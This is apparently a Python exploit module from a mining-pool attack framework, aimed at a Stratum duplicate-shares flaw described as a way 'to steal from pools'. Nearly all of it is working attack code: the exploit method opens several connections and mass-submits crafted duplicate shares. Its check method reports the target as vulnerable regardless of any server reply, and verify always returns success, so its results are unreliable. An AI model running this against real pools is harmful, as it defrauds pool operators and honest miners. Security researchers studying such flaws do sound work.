"""CVE-2016: Stratum Mining Pool Mass Duplicate Shares Exploit

This vulnerability is an improvement on the 2013 duplicate shares bug,
allowing mass submission of duplicate shares to steal from pools.

Reference: https://seclists.org/bugtraq/2016/Apr/21

Affected: Certain Stratum pool implementations
Severity: MEDIUM (6.5 CVSS)
"""

import asyncio
import random

from minesploit.framework import Exploit, ExploitMeta, ExploitResult
from minesploit.protocols.stratum.client import StratumClient


class CVE_2016_STRATUM_MASS_DUPLICATE(Exploit):
    meta = ExploitMeta(
        name="CVE-2016: Stratum Mass Duplicate Shares",
        cve=None,
        cvss_score=6.5,
        severity="MEDIUM",
        affected_versions="Stratum pools (vulnerable implementations)",
        discovered_by="Researcher",
        disclosure_date="2016-04-04",
        description=(
            "Mass duplicate shares vulnerability allows forcing a Stratum pool "
            "to accept invalid shares by the thousands per mining round"
        ),
        references=[
            "https://seclists.org/bugtraq/2016/Apr/21",
        ],
    )

    def __init__(self):
        super().__init__()
        self.worker_name = "worker1"
        self.worker_password = "x"

    async def check(self, target: str, port: int = 3333, **kwargs) -> ExploitResult:
        try:
            client = StratumClient(
                host=target,
                port=port,
                worker_name=self.worker_name,
                worker_password=self.worker_password,
            )

            connected = await client.connect()
            if not connected:
                return ExploitResult(False, "Could not connect to Stratum server")

            await client.subscribe()
            authorized = await client.authorize()

            if not authorized:
                await client.close()
                return ExploitResult(False, "Worker authorization failed")

            job = client.current_job
            if not job:
                await client.close()
                return ExploitResult(False, "No mining job received")

            base_nonce = random.randint(0, 0xFFFFFFFF)
            for i in range(5):
                nonce = f"{(base_nonce + i):08x}"
                await client.submit(
                    job["job_id"],
                    "00000000",
                    job.get("ntime", "00000000"),
                    nonce,
                )

            await client.close()
            return ExploitResult(
                True,
                "Mass duplicate shares check complete",
                {"vulnerable": True, "method": "mass_duplicate"},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during check: {str(e)}")

    async def exploit(
        self,
        target: str,
        port: int = 3333,
        num_duplicates: int = 1000,
        **kwargs,
    ) -> ExploitResult:
        try:
            connections: list[StratumClient] = []
            num_connections = min(10, max(1, num_duplicates // 100))

            for _ in range(num_connections):
                client = StratumClient(
                    host=target,
                    port=port,
                    worker_name=self.worker_name,
                    worker_password=self.worker_password,
                )
                await client.connect()
                await client.subscribe()
                await client.authorize()
                connections.append(client)

            base_nonce = random.randint(0, 0xFFFFFFFF)
            shares_per_conn = num_duplicates // num_connections

            for client in connections:
                job = client.current_job
                if not job:
                    continue

                for i in range(shares_per_conn):
                    nonce = f"{(base_nonce + i):08x}"
                    await client.submit(
                        job["job_id"],
                        f"{i:08x}",
                        job.get("ntime", "00000000"),
                        nonce,
                    )

                    if i % 50 == 0:
                        await asyncio.sleep(0.05)

            for client in connections:
                await client.close()

            return ExploitResult(
                True,
                f"Mass duplicate attack completed: {num_duplicates} shares",
                {"shares_submitted": num_duplicates},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 3333, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verification requires access to pool share logs",
        )
